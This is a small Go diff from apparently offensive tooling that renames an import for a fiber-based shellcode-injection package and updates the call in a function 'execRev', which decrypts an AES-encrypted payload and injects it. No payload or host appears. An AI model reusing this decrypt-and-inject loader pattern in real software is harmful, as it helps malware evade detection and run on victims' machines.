@@ -7,7 +7,7 @@ import (
 	"encoding/base64"
 	"syscall"
 
-	shellcode "github.com/MrTuxx/OffensiveGolang/pkg/payloads/injections/fibers"
+	"github.com/MrTuxx/OffensiveGolang/pkg/payloads/injections/fibers/fibers_v1"
 )
 
 const (
@@ -39,7 +39,7 @@ func execRev() {
 	stream := cipher.NewCTR(block, key[aes.BlockSize:])
 	stream.XORKeyStream(plaintext, ciphertext)
 
-	shellcode.ShellcodeFibers(Shellcode, Password)
+	fibers_v1.ShellcodeFibers(Shellcode, Password)
 
 }
 
